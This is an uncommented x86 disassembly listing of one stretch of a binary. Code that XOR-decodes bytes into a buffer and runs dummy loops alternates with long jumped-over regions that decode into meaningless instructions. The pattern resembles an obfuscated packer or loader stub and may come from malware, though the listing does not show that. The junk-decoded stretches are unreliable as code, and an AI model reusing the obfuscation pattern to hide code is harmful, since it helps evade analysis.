  410a32:	ins    BYTE PTR es:[edi],dx
  410a33:	enter  0x9420,0x44
  410a37:	sub    DWORD PTR [edi+edx*1],ebp
  410a3a:	pop    ebp
  410a3b:	hlt    
  410a3c:	jle    0x4109f6
  410a3e:	setne  dl
  410a41:	bnd data16 jne 0x410a8f
  410a45:	cli    
  410a46:	call   0x4419ff11
  410a4b:	jmp    0x410a7a
  410a4d:	mov    edi,0x4a0ec3e2
  410a52:	in     eax,dx
  410a53:	push   esi
  410a54:	mov    eax,0xf89c8532
  410a59:	pop    edi
  410a5a:	pop    esi
  410a5b:	leave  
  410a5c:	ret    0xc
  410a5f:	push   ebp
  410a60:	mov    ebp,esp
  410a62:	mov    eax,DWORD PTR [ebp+0xc]
  410a65:	xor    edx,edx
  410a67:	mov    ecx,0x7264fca9
  410a6c:	div    ecx
  410a6e:	mov    ecx,DWORD PTR [ebp+0x10]
  410a71:	and    ecx,eax
  410a73:	or     ecx,0x81161d8f
  410a79:	mov    eax,ecx
  410a7b:	pop    ebp
  410a7c:	ret    0x18
  410a7f:	push   ebp
  410a80:	mov    ebp,esp
  410a82:	sub    esp,0x58
  410a85:	xor    DWORD PTR ds:0x4336e7,ecx
  410a8b:	mov    ecx,DWORD PTR [ebp+0x8]
  410a8e:	movzx  eax,WORD PTR ds:0x4336bf
  410a95:	sbb    eax,DWORD PTR ds:0x433743
  410a9b:	mov    ds:0x4336bf,eax
  410aa0:	mov    eax,0x8a3c
  410aa5:	xor    ax,WORD PTR [ecx+0x20]
  410aa9:	and    DWORD PTR ds:0x4336b7,0x4336ff
  410ab3:	mov    ecx,0x3b02
  410ab8:	add    ax,cx
  410abb:	and    DWORD PTR ds:0x4336af,0x7f6b
  410ac5:	movzx  eax,ax
  410ac8:	xor    DWORD PTR ds:0x433667,0x6006
  410ad2:	mov    DWORD PTR [ebp-0xc],eax
  410ad5:	mov    BYTE PTR [ebp-0x1],0x7f
  410ad9:	adc    ecx,0x1b78
  410adf:	lea    eax,[ebp-0x1]
  410ae2:	mov    DWORD PTR [ebp-0x10],eax
  410ae5:	adc    ecx,DWORD PTR ds:0x4336f7
  410aeb:	mov    al,BYTE PTR [ebp-0x1]
  410aee:	mov    ecx,DWORD PTR [ebp-0x10]
  410af1:	xor    al,0x46
  410af3:	sub    al,0x38
  410af5:	adc    DWORD PTR ds:0x43362b,0x433637
  410aff:	mov    BYTE PTR [ecx],al
  410b01:	xor    eax,eax
  410b03:	xor    eax,DWORD PTR ds:0x43362b
  410b09:	sbb    DWORD PTR ds:0x433673,eax
  410b0f:	jmp    0x410cab
  410b14:	add    DWORD PTR [ecx-0x1ca338a4],eax
  410b1a:	mov    eax,ds:0xb67bce41
  410b1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b20:	int    0xde
  410b22:	(bad)  
  410b23:	jle    0x410b32
  410b25:	inc    esi
  410b26:	jle    0x410ba6
  410b28:	icebp  
  410b29:	jg     0x410ba9
  410b2b:	jle    0x410b3f
  410b2d:	scas   al,BYTE PTR es:[edi]
  410b2e:	loop   0x410ae4
  410b30:	out    dx,al
  410b31:	in     al,0xb
  410b33:	arpl   ax,sp
  410b35:	pop    es
  410b36:	push   ecx
  410b37:	jg     0x410b84
  410b39:	or     dl,ch
  410b3b:	jg     0x410ba6
  410b3d:	push   ds
  410b3e:	lock or BYTE PTR [ebp+0x3b4942ee],al
  410b45:	jae    0x410bab
  410b47:	aas    
  410b48:	push   ds
  410b49:	gs and eax,0xc0908285
  410b4f:	repnz les esi,FWORD PTR [edi+0x1d7c7711]
  410b56:	(bad)  
  410b57:	enter  0x96fb,0x25
  410b5b:	pop    edx
  410b5c:	fmul   QWORD PTR [edi+edx*8]
  410b5f:	cmp    eax,0x8f4a3967
  410b64:	aaa    
  410b65:	xor    al,0x6d
  410b67:	icebp  
  410b68:	xchg   esi,eax
  410b69:	pop    edi
  410b6a:	dec    ebx
  410b6b:	dec    eax
  410b6c:	ss pop ss
  410b6e:	add    al,BYTE PTR [ecx]
  410b70:	fwait
  410b71:	lock mov al,ds:0x5f2b7c71
  410b77:	std    
  410b78:	(bad)  
  410b79:	lods   al,BYTE PTR ds:[esi]
  410b7a:	mov    ds:0xdcba0403,al
  410b7f:	ss dec edi
  410b81:	mov    al,ds:0x72455b60
  410b86:	repnz shl BYTE PTR [esi+edx*1+0x21c79cdb],cl
  410b8e:	leave  
  410b8f:	out    0xd4,al
  410b91:	popa   
  410b92:	stc    
  410b93:	out    0xd4,eax
  410b95:	mov    cs,WORD PTR [esi-0x28c23cbc]
  410b9b:	rcr    ah,0xb3
  410b9e:	mov    esi,fs
  410ba0:	stc    
  410ba1:	mov    edx,0x6c43b0a1
  410ba6:	adc    BYTE PTR ds:0xb89a6b38,bl
  410bac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bad:	out    0xce,al
  410baf:	imul   DWORD PTR [ebp-0x1be4e14]
  410bb5:	and    al,0x6b
  410bb7:	lock aas 
  410bb9:	in     al,dx
  410bba:	hlt    
  410bbb:	in     al,0xea
  410bbd:	cmc    
  410bbe:	int3   
  410bbf:	dec    ecx
  410bc0:	dec    ebx
  410bc1:	add    eax,0xf08eb4d7
  410bc6:	(bad)  
  410bc8:	stos   BYTE PTR es:[edi],al
  410bc9:	dec    ebp
  410bca:	add    al,0xe
  410bcc:	or     BYTE PTR [ecx+ecx*2],dl
  410bcf:	int    0x56
  410bd1:	stc    
  410bd2:	cmp    BYTE PTR [ecx-0x3c],cl
  410bd5:	jp     0x410c28
  410bd7:	mov    ds:0xa027e397,eax
  410bdc:	dec    edi
  410bdd:	jns    0x410c1f
  410bdf:	cmp    ebp,DWORD PTR [esi]
  410be1:	aaa    
  410be2:	adc    BYTE PTR [ecx],al
  410be4:	retf   0x25b2
  410be7:	xlat   BYTE PTR ds:[ebx]
  410be8:	cli    
  410be9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bea:	ret    
  410beb:	pop    ecx
  410bec:	and    BYTE PTR [edx],0xc2
  410bef:	mov    ecx,0x3914e5d8
  410bf4:	inc    esi
  410bf5:	xchg   esi,eax
  410bf6:	cdq    
  410bf7:	in     al,0xfd
  410bf9:	cmp    BYTE PTR [ebx-0x5b],bh
  410bfc:	call   0xe151:0x4227c758
  410c03:	xchg   esp,eax
  410c04:	jo     0x410c2e
  410c06:	ret    0x2413
  410c09:	jne    0x410c6a
  410c0b:	xchg   esi,eax
  410c0c:	into   
  410c0d:	in     al,0x33
  410c0f:	std    
  410c10:	cmp    eax,0x8f4f691c
  410c15:	push   edi
  410c16:	cmp    DWORD PTR [ebx+0x6de1659e],esp
  410c1c:	add    BYTE PTR [eax],cl
  410c1e:	sbb    eax,0x1f4273ea
  410c23:	mov    al,ds:0xedffe8e4
  410c28:	sub    ebp,DWORD PTR [edx+ebx*8-0x4c]
  410c2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c2d:	test   DWORD PTR [ecx-0x50a534d8],edx
  410c33:	ja     0x410c9e
  410c35:	adc    ebx,DWORD PTR [esi-0x75]
  410c38:	jno    0x410bff
  410c3a:	(bad)  
  410c3b:	stos   DWORD PTR es:[edi],eax
  410c3c:	xchg   edi,eax
  410c3d:	in     eax,0x86
  410c3f:	xchg   ebp,eax
  410c40:	add    bl,dh
  410c42:	test   BYTE PTR [edx-0x32],0xf8
  410c46:	pop    esi
  410c47:	push   edi
  410c48:	mov    ebp,0x34ac25ac
  410c4d:	(bad)  
  410c4e:	out    0xb0,al
  410c50:	ror    BYTE PTR [esi-0x5c],cl
  410c53:	out    0xc2,eax
  410c55:	sub    esp,ecx
  410c57:	push   edi
  410c58:	adc    BYTE PTR [ebx+ebx*4+0x3c9efee3],0x9f
  410c60:	mul    esi
  410c62:	mov    eax,0xaa4e1eb7
  410c67:	pop    esi
  410c68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c69:	mov    bl,0xc2
  410c6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c6c:	pop    ecx
  410c6d:	stc    
  410c6e:	dec    ebx
  410c6f:	popa   
  410c70:	aam    0xe2
  410c72:	js     0x410c3a
  410c74:	and    ebp,0x6b
  410c77:	xchg   ebx,eax
  410c78:	fstp   TBYTE PTR [esi]
  410c7a:	daa    
  410c7b:	aas    
  410c7c:	cs and al,0x5e
  410c7f:	lock aaa 
  410c81:	out    0xc4,eax
  410c83:	ficomp WORD PTR [edi]
  410c85:	mov    ebx,0xb24c32ea
  410c8a:	push   es
  410c8b:	xchg   esi,eax
  410c8c:	xor    al,0x54
  410c8e:	out    dx,al
  410c8f:	loop   0x410cb1
  410c91:	(bad)  
  410c92:	mov    edx,0x20181be
  410c97:	pop    ebp
  410c98:	xchg   ebx,eax
  410c99:	cmovno eax,DWORD PTR [ecx+edi*4-0x558cf38e]
  410ca1:	mov    BYTE PTR [ecx-0x80],bh
  410ca4:	sti    
  410ca5:	cs xchg ecx,eax
  410ca7:	push   es
  410ca8:	cmp    eax,0x45c71781
  410cad:	clc    
  410cae:	xor    DWORD PTR [ebp-0x3ff40764],eax
  410cb4:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  410cbb:	mov    eax,DWORD PTR [ebp-0x8]
  410cbe:	or     DWORD PTR ds:0x4336ef,0x3fd0
  410cc8:	mov    ecx,0x7510854
  410ccd:	mov    DWORD PTR ds:0x43362f,0x62c3
  410cd7:	push   esi
  410cd8:	xor    eax,ecx
  410cda:	or     esi,DWORD PTR ds:0x43362f
  410ce0:	mov    esi,0x32729b
  410ce5:	add    eax,esi
  410ce7:	jmp    0x410cfe
  410cec:	mov    dl,BYTE PTR [ebp-0x1]
  410cef:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  410cf3:	mov    DWORD PTR ds:0x43362f,0x530d
  410cfd:	inc    eax
  410cfe:	mov    DWORD PTR ds:0x43366b,0x3584
  410d08:	cmp    eax,0x40
  410d0b:	mov    DWORD PTR ds:0x43367f,0x3d5c
  410d15:	jb     0x410cec
  410d1b:	mov    eax,ds:0x43362f
  410d20:	add    eax,DWORD PTR ds:0x433703
  410d26:	mov    ds:0x43362f,eax
  410d2b:	mov    edx,DWORD PTR [ebp-0x8]
  410d2e:	mov    DWORD PTR ds:0x43373f,0x17
  410d38:	cmp    DWORD PTR ds:0x43373f,0x0
  410d3f:	je     0x410d94
  410d45:	cmp    DWORD PTR ds:0x43373f,0x4
  410d4c:	jne    0x410d69
  410d52:	push   DWORD PTR [ebp-0x20]
  410d55:	push   DWORD PTR [ebp-0x28]
  410d58:	push   DWORD PTR [ebp-0xc]
  410d5b:	push   DWORD PTR [ebp-0x1c]
  410d5e:	push   0x2fed
  410d63:	call   DWORD PTR ds:0x4123b0
  410d69:	cmp    DWORD PTR ds:0x43373f,0x5
  410d70:	jne    0x410d84
  410d76:	xor    eax,eax
  410d78:	xor    eax,DWORD PTR ds:0x43373f
  410d7e:	dec    eax
  410d7f:	mov    ds:0x43373f,eax
  410d84:	mov    eax,ds:0x43373f
  410d89:	dec    eax
  410d8a:	mov    ds:0x43373f,eax
  410d8f:	jmp    0x410d38
  410d94:	mov    eax,DWORD PTR [ebp-0xc]
  410d97:	add    DWORD PTR ds:0x433623,0x2cfa
  410da1:	xor    edx,ecx
  410da3:	sbb    DWORD PTR ds:0x43373b,0x4112
  410dad:	add    edx,esi
  410daf:	mov    DWORD PTR ds:0x4336b3,0x2f1c
  410db9:	cmp    edx,eax
  410dbb:	jmp    0x410f57
  410dc0:	adc    al,0x14
  410dc2:	in     al,0x8b
  410dc4:	in     al,0x6b
  410dc6:	jno    0x410d59
  410dc8:	aad    0x1d
  410dca:	dec    ebx
  410dcb:	add    ah,BYTE PTR [ebx]
  410dcd:	out    dx,al
  410dce:	iret   
  410dcf:	nop
  410dd0:	mov    WORD PTR [edi+0x7e],es
  410dd3:	jle    0x410dc6
  410dd5:	jg     0x410e55
  410dd7:	jle    0x410d7b
  410dd9:	aaa    
  410dda:	je     0x410e43
  410ddc:	pop    esi
  410ddd:	fnstsw WORD PTR [eax+0x65]
  410de0:	into   
  410de1:	push   esp
  410de2:	jmp    esp
  410de4:	jmp    0x410d78
  410de6:	cdq    
  410de7:	mov    ebx,DWORD PTR [ebx+0x5d2913d5]
  410ded:	and    al,BYTE PTR [ecx]
  410def:	call   0x2b5c2cca
  410df4:	sub    eax,0x76b9ef8
  410df9:	xchg   BYTE PTR ds:0xb5d7bd9c,al
  410dff:	je     0x410d9c
  410e01:	jmp    0xd0e71a6e
  410e06:	dec    esi
  410e07:	fcom   DWORD PTR [esi+0x66ab5b60]
  410e0d:	jl     0x410ddd
  410e0f:	mov    dl,0x9c
  410e11:	out    dx,al
  410e12:	cld    
  410e13:	xchg   edx,eax
  410e14:	stc    
  410e15:	add    esp,0xf834e0f8
  410e1b:	dec    edx
  410e1c:	out    0x87,al
  410e1e:	jno    0x410e8f
  410e20:	lds    edx,FWORD PTR [edx-0x4a]
  410e23:	mov    edx,0xefb90d6f
  410e28:	xor    al,ch
  410e2a:	and    eax,0x67f04d60
  410e2f:	adc    ah,BYTE PTR [esi]
  410e31:	add    cl,BYTE PTR ds:[ecx-0x6e]
  410e35:	aad    0xeb
  410e37:	repz fcom QWORD PTR [edx]
  410e3a:	xchg   esp,eax
  410e3b:	cld    
  410e3c:	pushf  
  410e3d:	mov    DWORD PTR [edx+0x5be7bcf6],esp
  410e43:	es jnp 0x410e7b
  410e46:	sub    BYTE PTR [edi+0x47b6663f],bl
  410e4c:	inc    esi
  410e4d:	fcomip st,st(0)
  410e4f:	clc    
  410e50:	pop    ecx
  410e51:	lods   eax,DWORD PTR ds:[esi]
  410e52:	pop    esi
  410e53:	enter  0x74e1,0x0
  410e57:	mov    al,BYTE PTR [ebp+esi*1-0x18b38082]
  410e5e:	jmp    0xc344:0x14084c8e
  410e65:	cmp    eax,edi
  410e67:	adc    eax,0xc812a6f4
  410e6c:	aas    
  410e6d:	dec    ebx
  410e6e:	sbb    al,0x48
  410e70:	xchg   ebp,eax
  410e71:	xor    cl,dl
  410e73:	pop    ecx
  410e74:	add    BYTE PTR [ecx+0x4c],bl
  410e77:	sar    DWORD PTR [eax],cl
  410e79:	inc    esp
  410e7a:	xor    ebp,eax
  410e7c:	jp     0x410ed5
  410e7e:	pop    ecx
  410e7f:	sbb    DWORD PTR [edi+ebp*2-0x1],0xffffff93
  410e84:	pusha  
  410e85:	xchg   DWORD PTR [ecx-0x72],edx
  410e88:	mov    bh,0xc1
  410e8a:	xor    edx,DWORD PTR [ebx]
  410e8c:	aad    0xea
  410e8e:	(bad)  
  410e8f:	repz scas eax,DWORD PTR es:[edi]
  410e91:	sbb    bh,BYTE PTR ds:0x17f23413
  410e97:	addr16 mov eax,ds:0xafa6
  410e9b:	jne    0x410e2a
  410e9d:	and    DWORD PTR [eax+0x14],edi
  410ea0:	sub    eax,0x6f6065f7
  410ea5:	xor    ebx,DWORD PTR [ebp-0x352fcac]
  410eab:	xchg   esi,eax
  410eac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ead:	lods   al,BYTE PTR ds:[esi]
  410eae:	jnp    0x410e6b
  410eb0:	jmp    0x67283a6a
  410eb5:	jns    0x410efc
  410eb7:	cdq    
  410eb8:	mov    bl,0x17
  410eba:	dec    ebx
  410ebb:	jle    0x410f02
  410ebd:	pop    esi
  410ebe:	sub    ebx,ebx
  410ec0:	mov    ebp,DWORD PTR [ebx]
  410ec2:	xor    cl,0x66
  410ec5:	loop   0x410eff
  410ec7:	popa   
  410ec8:	mov    al,0xec
  410eca:	and    eax,DWORD PTR ds:0xe4afa34b
  410ed0:	aad    0x4e
  410ed2:	xchg   esi,eax
  410ed3:	and    DWORD PTR [ecx-0x1],0x7ce6ed59
  410eda:	mov    eax,ebx
  410edc:	pushf  
  410edd:	mov    ch,0xe3
  410edf:	loop   0x410f0a
  410ee1:	inc    ebp
  410ee2:	dec    esi
  410ee3:	ret    
  410ee4:	aaa    
  410ee5:	call   0x75e66ce5
  410eea:	sbb    BYTE PTR [eax+0x7c],dh
  410eed:	in     al,dx
  410eee:	inc    esp
  410eef:	cmp    DWORD PTR [edi-0xf62d170],ebp
  410ef5:	aaa    
  410ef6:	(bad)  
  410ef7:	hlt    
  410ef8:	outs   dx,BYTE PTR ds:[esi]
  410ef9:	mov    esi,0xb9105e96
  410efe:	mov    al,0xb0
  410f00:	push   ecx
  410f01:	inc    ebp
  410f02:	adc    BYTE PTR ds:0x75265067,0xb5
  410f09:	fcomp  DWORD PTR [ebp+ecx*2+0x2060bc37]
  410f10:	std    
  410f11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f12:	out    dx,al
  410f13:	int3   
  410f14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f15:	icebp  
  410f16:	sub    DWORD PTR [eax],ecx
  410f18:	out    0xce,eax
  410f1a:	shl    BYTE PTR [ecx],1
  410f1c:	sub    eax,0x8208d31c
  410f21:	les    esp,FWORD PTR [ebp-0x51aaeae7]
  410f27:	mov    ds:0xcf9b885e,al
  410f2c:	cmp    eax,DWORD PTR [ecx+0x2ade0bf3]
  410f32:	cmc    
  410f33:	add    eax,0xec9016c0
  410f38:	ret    
  410f39:	cs pushf 
  410f3b:	and    dl,BYTE PTR [ebx+0x5c48f0f7]
  410f41:	cmc    
  410f42:	popf   
  410f43:	in     al,dx
  410f44:	das    
  410f45:	mov    ds:0x5c43fbbc,eax
  410f4a:	or     BYTE PTR [eax],al
  410f4c:	adc    esi,DWORD PTR [ecx]
  410f4e:	or     ebp,ecx
  410f50:	psubsb mm0,QWORD PTR [edx]
  410f53:	into   
  410f54:	mov    ebp,0x840f99d7
  410f59:	push   edi
  410f5a:	add    al,BYTE PTR [eax]
  410f5c:	add    BYTE PTR [ebx],dh
  410f5e:	rol    BYTE PTR [ebx],0x5
  410f61:	das    
  410f62:	aaa    
  410f63:	inc    ebx
  410f64:	add    BYTE PTR [ecx],ch
  410f66:	add    eax,0x433733
  410f6b:	push   ebx
  410f6c:	sub    eax,0x37b3
  410f71:	push   edi
  410f72:	mov    DWORD PTR ds:0x43367f,0x14
  410f7c:	cmp    DWORD PTR ds:0x43367f,0x0
  410f83:	je     0x410fda
  410f89:	cmp    DWORD PTR ds:0x43367f,0x2
  410f90:	jne    0x410fac
  410f96:	push   0x4336b3
  410f9b:	push   DWORD PTR [ebp-0x24]
  410f9e:	push   DWORD PTR [ebp-0x24]
  410fa1:	push   0x4a42
  410fa6:	call   DWORD PTR ds:0x4123b4
  410fac:	cmp    DWORD PTR ds:0x43367f,0x3
  410fb3:	jne    0x410fc6
  410fb9:	mov    edi,DWORD PTR ds:0x43367f
  410fbf:	dec    edi
  410fc0:	mov    DWORD PTR ds:0x43367f,edi
  410fc6:	xor    edi,edi
  410fc8:	or     edi,DWORD PTR ds:0x43367f
  410fce:	dec    edi
  410fcf:	mov    DWORD PTR ds:0x43367f,edi
  410fd5:	jmp    0x410f7c
  410fda:	mov    edi,DWORD PTR [ebp+0x8]
  410fdd:	mov    eax,0x8a3c
  410fe2:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410fe7:	jmp    0x411183
  410fec:	mov    dh,0xd4
  410fee:	ja     0x411052
  410ff0:	jne    0x411053
  410ff2:	mov    bl,0xd0
  410ff4:	ins    DWORD PTR es:[edi],dx
  410ff5:	push   edi
  410ff6:	push   ss
  410ff7:	push   ecx
  410ff8:	aas    
  410ff9:	loop   0x410fd0
  410ffb:	in     eax,0xf
  410ffd:	inc    ebp
  410ffe:	jle    0x41107e
  411000:	icebp  
  411001:	jg     0x411081
  411003:	jle    0x410ff6
  411005:	retf   
  411006:	lods   al,BYTE PTR ds:[esi]
  411007:	add    al,0x55
  411009:	push   es
  41100a:	inc    edi
  41100b:	inc    ecx
  41100c:	xor    BYTE PTR [ecx+0x584ad30e],cl
  411012:	push   edi
  411013:	fisttp WORD PTR [ebx+0x54]
  411016:	inc    eax
  411017:	pop    edx
  411018:	cmp    BYTE PTR [edx-0x3e7158b3],al
  41101e:	aaa    
  41101f:	hlt    
  411020:	std    
  411021:	sbb    ecx,DWORD PTR [ebp-0x67a7d911]
  411027:	push   ebx
  411028:	mov    ch,0x3b
  41102a:	jbe    0x1b87962f
  411030:	sbb    esi,esp
  411032:	pop    esi
  411033:	jecxz  0x411004
  411035:	and    esi,DWORD PTR [ecx]
  411037:	loope  0x410fbf
  411039:	xor    al,0x51
  41103b:	lods   al,BYTE PTR ds:[esi]
  41103c:	out    dx,al
  41103d:	jmp    0x411095
  41103f:	mul    BYTE PTR [eax+ebp*2]
  411042:	fmul   DWORD PTR [eax+0x48]
  411045:	push   0x32
  411047:	out    0xa9,al
  411049:	in     al,0xc9
  41104b:	arpl   WORD PTR [edi+eiz*1+0x5149b341],ax
  411052:	or     ah,cl
  411054:	mov    bh,0x8c
  411056:	loop   0x411018
  411058:	mov    bl,0x46
  41105a:	rol    BYTE PTR [edx],1
  41105c:	inc    ecx
  41105d:	jns    0x4110b7
  41105f:	inc    ecx
  411060:	jle    0x410ffc
  411062:	cmp    DWORD PTR [esi],ebx
  411064:	cmp    dl,BYTE PTR [ecx]
  411066:	ficom  DWORD PTR [ecx-0x2d]
  411069:	rol    BYTE PTR [edi+edi*1],1
  41106c:	aam    0x19
  41106e:	pop    ds
  41106f:	test   eax,0x2eb7eddf
  411074:	dec    esp
  411075:	(bad)  
  411076:	cmp    eax,edx
  411078:	std    
  411079:	inc    edx
  41107a:	and    eax,0x183e2835
  41107f:	push   0xffffff80
  411081:	xchg   ecx,eax
  411082:	sub    esp,DWORD PTR [eax]
  411084:	ds pop esi
  411086:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  411088:	and    al,0x88
  41108a:	pop    ecx
  41108b:	int    0x98
  41108d:	lods   al,BYTE PTR ds:[esi]
  41108e:	and    edi,DWORD PTR [ebx-0x69]
  411091:	jge    0x41106d
  411093:	scas   al,BYTE PTR es:[edi]
  411094:	fidiv  DWORD PTR [eax+edi*1+0x5]
  411098:	ds jp  0x4110c3
  41109b:	xchg   ebp,eax
  41109c:	shl    bl,cl
  41109e:	ficom  WORD PTR ds:0x2e982f71
  4110a5:	icebp  
  4110a6:	jae    0x4110c5
  4110a8:	call   0x28eb36b3
  4110ad:	adc    BYTE PTR [ecx+0x57a37217],al
  4110b3:	or     ebp,DWORD PTR ds:0x240d340a
  4110b9:	jecxz  0x41111d
  4110bb:	mov    eax,ds:0x5cd3a06e
  4110c0:	lods   eax,DWORD PTR ds:[esi]
  4110c1:	add    eax,DWORD PTR [eax-0x341fe214]
  4110c7:	mov    al,ds:0x5c7948e8
  4110cc:	(bad)  
  4110cd:	rcr    ecx,cl
  4110cf:	int    0x5f
  4110d1:	test   DWORD PTR [eax-0x69],ebx
  4110d4:	jge    0x41114e
  4110d6:	cwde   
  4110d7:	push   esp
  4110d8:	pushf  
  4110d9:	aam    0x7d
  4110db:	mov    esp,0xbae96094
  4110e0:	(bad)  
  4110e1:	xor    eax,0xbae95f0e
  4110e6:	push   0xb0802c77
  4110eb:	sub    esp,edi
  4110ed:	add    eax,0xef908ffc
  4110f2:	inc    esi
  4110f3:	out    0xaa,al
  4110f5:	rcr    BYTE PTR [edi-0x31bc75c3],0x75
  4110fc:	imul   eax,DWORD PTR [ebp+0x47],0x71
  411100:	outs   dx,DWORD PTR ds:[esi]
  411101:	sbb    DWORD PTR [ebx+ebp*4],esi
  411104:	cld    
  411105:	sub    al,0xc7
  411107:	jl     0x411094
  411109:	push   ecx
  41110a:	mov    ecx,0x2c0ef448
  41110f:	sbb    DWORD PTR [edi-0x6d80f4a],ebx
  411115:	mov    esp,0x179193f3
  41111a:	iret   
  41111b:	leave  
  41111c:	mov    ds:0x76aba44e,eax
  411121:	cli    
  411122:	xor    BYTE PTR [edi+eax*8],ah
  411125:	mov    esi,0x76d2cdc1
  41112a:	mov    ds:0x97a4827e,eax
  41112f:	aas    
  411130:	(bad)  
  411131:	dec    ebp
  411132:	xor    edx,DWORD PTR [ecx]
  411134:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411135:	xor    DWORD PTR [ecx],edi
  411137:	repz mov esi,0x1185bd1e
  41113d:	push   0x6c4682a7
  411142:	test   BYTE PTR [edx+0x1],0xb0
  411146:	pop    ebx
  411147:	adc    ch,BYTE PTR [edx]
  411149:	fs add eax,0xcc685121
  41114f:	or     BYTE PTR [eax],ch
  411151:	mov    WORD PTR [eax],ss
  411153:	jge    0x411134
  411155:	adc    edx,edi
  411157:	ss js  0x4111c8
  41115a:	outs   dx,BYTE PTR ds:[esi]
  41115b:	cmp    al,0x6d
  41115e:	int    0xa2
  411160:	scas   eax,DWORD PTR es:[edi]
  411161:	test   DWORD PTR [edx-0x612fd901],0x19520f97
  41116b:	ins    DWORD PTR es:[edi],dx
  41116c:	pop    ds
  41116d:	cmp    BYTE PTR [esi+0x21],ch
  411170:	jmp    0xcaa5:0x28c4b966
  411177:	push   eax
  411178:	ret    0x8c79
  41117b:	int    0x62
  41117d:	call   0xbf04:0x1d7d1482
  411184:	add    bh,BYTE PTR [ebx]
  411186:	add    BYTE PTR [eax],al
  411188:	add    ax,di
  41118b:	movzx  eax,ax
  41118e:	mov    DWORD PTR [ebp-0x14],eax
  411191:	mov    eax,DWORD PTR [ebp+0x8]
  411194:	movzx  eax,WORD PTR [eax+edx*4]
  411198:	xor    eax,0x8a3c
  41119d:	add    eax,edi
  41119f:	mov    edi,DWORD PTR [ebp-0x14]
  4111a2:	mov    BYTE PTR [ebp+edi*1-0x58],al
  4111a6:	mov    eax,DWORD PTR [ebp-0xc]
  4111a9:	inc    edx
  4111aa:	cmp    edx,eax
  4111ac:	jne    0x410f72
  4111b2:	pop    edi
  4111b3:	pop    ebx
  4111b4:	mov    eax,DWORD PTR [ebp-0x8]
  4111b7:	mov    edx,DWORD PTR [ebp+0x10]
  4111ba:	xor    eax,ecx
  4111bc:	add    eax,esi
  4111be:	mov    DWORD PTR [edx],eax
  4111c0:	mov    eax,DWORD PTR [ebp-0x8]
  4111c3:	xor    eax,ecx
  4111c5:	add    eax,esi
  4111c7:	mov    DWORD PTR [ebp+0x8],eax
  4111ca:	mov    eax,DWORD PTR [ebp+0x8]
  4111cd:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4111d1:	mov    dl,BYTE PTR [ebp-0x1]
  4111d4:	cmp    al,dl
  4111d6:	je     0x4113b5
  4111dc:	mov    eax,DWORD PTR [ebp+0x8]
  4111df:	jmp    0x41137b
  4111e4:	mov    ah,0x98
  4111e6:	adc    al,ch
  4111e8:	adc    dh,BYTE PTR [ebp+0x71]
  4111eb:	imul   ebx,ebp,0xeedabba7
  4111f1:	leave  
  4111f2:	add    DWORD PTR [ebx+0x7e7e428e],ebx
  4111f8:	icebp  
  4111f9:	jg     0x411279
  4111fb:	jle    0x411218
  4111fd:	pop    esi
  4111fe:	adc    DWORD PTR [ebx-0x16de1854],edx
  411204:	adc    ecx,eax
  411206:	repz test al,0x25
  411209:	aad    0x61
  41120b:	push   ebp
  41120c:	pop    ebx
  41120d:	in     eax,0xaf
  41120f:	fnstenv [esp+0x48]
  411213:	das    
  411214:	test   BYTE PTR [esi-0xf],dh
  411217:	jge    0x4111bc
  411219:	sub    eax,0x873e292c
  41121e:	dec    ecx
  41121f:	(bad)  
  411221:	or     al,0x60
  411223:	leave  
  411224:	test   al,0xb3
  411226:	neg    cl
  411228:	xchg   BYTE PTR [ebx-0x6492b53b],ah
  41122e:	mov    edi,0xe6769ae9
  411233:	pushf  
  411234:	jo     0x411235
  411236:	out    0x2f,eax
  411238:	js     0x411272
  41123a:	pop    ebx
  41123b:	call   0xfc4a:0xd019ea4a
  411242:	inc    ebp
  411243:	inc    esp
  411244:	push   ecx
  411245:	(bad)  
  411247:	jae    0x41128c
  411249:	retf   
  41124a:	mov    ebp,0x5f295387
  41124f:	push   ebp
  411250:	mov    esi,0x3200cbb5
  411255:	mov    esi,0x3b12d073
  41125a:	mov    bl,0x37
  41125c:	fstp   QWORD PTR [esi+esi*8-0x61]
  411260:	call   0xfd9f:0x4325b246
  411267:	sbb    DWORD PTR [edx-0xc],0xffffffe8
  41126b:	retf   0x1016
  41126e:	fimul  WORD PTR [edx-0x1d]
  411271:	imul   eax,eax,0xffffffed
  411274:	or     dh,BYTE PTR [ebp+0x2b]
  411277:	fmulp  st(4),st
  411279:	jne    0x411241
  41127b:	pop    ds
  41127c:	and    al,BYTE PTR [eax+0x3e]
  41127f:	call   0x456f3b3e
  411284:	jae    0x411212
  411286:	pop    edx
  411287:	add    eax,0x63935a16
  41128c:	pop    ebp
  41128d:	cmp    esi,DWORD PTR [esi+0x1eb195e3]
  411293:	sbb    BYTE PTR [ebp-0x3d0a956a],0xe4
  41129a:	jae    0x4112ee
  41129c:	into   
  41129d:	xchg   ebx,eax
  41129e:	out    dx,al
  41129f:	add    ah,BYTE PTR [esi+esi*8+0x42]
  4112a3:	push   es
  4112a4:	xor    BYTE PTR [ebx],0x95
  4112a7:	mov    ebx,0x26b88143
  4112ac:	or     BYTE PTR [eax+ebx*1-0xe1ec46e],0xb0
  4112b4:	(bad)  
  4112b6:	fstp   st(4)
  4112b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112b9:	test   al,0x92
  4112bb:	cmp    dl,ch
  4112bd:	ficomp DWORD PTR [eax]
  4112bf:	or     BYTE PTR [eax*8+0x1edcc480],ch
  4112c6:	pop    es
  4112c7:	mov    esi,0xe8e41d57
  4112cc:	xor    eax,0x3ab875d9
  4112d1:	mov    ds:0xfa973ad0,al
  4112d6:	jecxz  0x411327
  4112d8:	dec    eax
  4112d9:	xchg   ebp,eax
